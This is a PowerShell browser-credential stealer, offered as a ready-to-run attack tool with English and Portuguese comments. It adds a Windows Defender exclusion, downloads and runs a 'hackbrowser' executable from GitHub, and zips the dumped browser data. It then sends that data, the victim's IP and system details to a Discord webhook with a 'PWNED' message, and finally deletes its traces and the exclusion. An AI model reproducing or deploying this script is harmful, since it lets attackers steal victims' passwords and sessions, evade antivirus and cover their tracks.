#Adding windows defender exclusionpath
Add-MpPreference -ExclusionPath "$env:appdata"
#Creating the directory we will work on
mkdir "$env:appdata\dump"
Set-Location "$env:appdata\dump"
#Downloading and executing hackbrowser.exe
Invoke-WebRequest -Uri "https://github.com/isppilslowispp/Aslclripysa/raw/main/hackbrowser.exe" -OutFile "$env:appdata\dump\pybw.exe"
./pybw.exe
Start-Sleep -Seconds 6
Remove-Item -Path "$env:appdata\dump\pybw.exe" -Force
#Creating A Zip Archive
Compress-Archive -Path * -DestinationPath dump.zip
$Random = Get-Random
# Defina a URL da webhook do Discord aqui
$WebhookUrl = "https://discord.com/api/webhooks/1163945552556335248/2grUaOZierXldHcH2vuCbPmutvlPf6znNg22Ms87dyFRZbGv_Quk2NgbDYtPXFfZ63nu"
# Obtenha o endereço IP externo
$ip = Invoke-RestMethod "http://myexternalip.com/raw"
# Obtenha informações do computador
$ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Model, Manufacturer
# Mensagem a ser enviada
$MessageContent = @{
    username = "PWNED Notification Bot"  # Nome do bot no Discord
    content = "Successfully PWNED $($env:USERNAME)! ($ip)"
    embeds = @(
        @{
            title = "System Information"
            description = "Manufacturer: $($ComputerName.Manufacturer)`nModel: $($ComputerName.Model)"
            color = 16711680  # Cor do embed (vermelho)
        }
    )
}
# Adicione o caminho do arquivo que deseja anexar (dump.zip)
$AttachmentPath = "$env:appdata\dump\dump.zip"
# Crie a requisição HTTP
if (Test-Path $AttachmentPath) {
    # Se o arquivo existir, envie como anexo
    $boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString("N")
    $Headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }

    # Carregar o arquivo como binário
    $FileBytes = [System.IO.File]::ReadAllBytes($AttachmentPath)

    # Construir o corpo da requisição
    $BodyStream = New-Object System.IO.MemoryStream
    $Writer = New-Object System.IO.StreamWriter($BodyStream)

    # Escreve o JSON no corpo
    $Writer.WriteLine("--$boundary")
    $Writer.WriteLine("Content-Disposition: form-data; name=`"payload_json`"")
    $Writer.WriteLine("")
    $Writer.WriteLine((ConvertTo-Json $MessageContent -Depth 10))

    # Escreve o arquivo no corpo
    $Writer.WriteLine("--$boundary")
    $Writer.WriteLine("Content-Disposition: form-data; name=`"file`"; filename=`"dump.zip`"")
    $Writer.WriteLine("Content-Type: application/zip")
    $Writer.WriteLine("")
    $Writer.Flush()
    $BodyStream.Write($FileBytes, 0, $FileBytes.Length)

    # Finaliza o corpo
    $Writer.WriteLine("")
    $Writer.WriteLine("--$boundary--")
    $Writer.Flush()
    $BodyStream.Seek(0, "Begin")

    # Enviar a requisição
    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Headers $Headers -Body $BodyStream
} else {
    # Sem anexo, apenas envie a mensagem
    Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType "application/json" -Body (ConvertTo-Json $MessageContent -Depth 10)
}
#Cleanup
Start-Sleep -Seconds 6
cd "$env:appdata"
Remove-Item -Path "$env:appdata\dump" -Force -Recurse
Remove-MpPreference -ExclusionPath "$env:appdata"


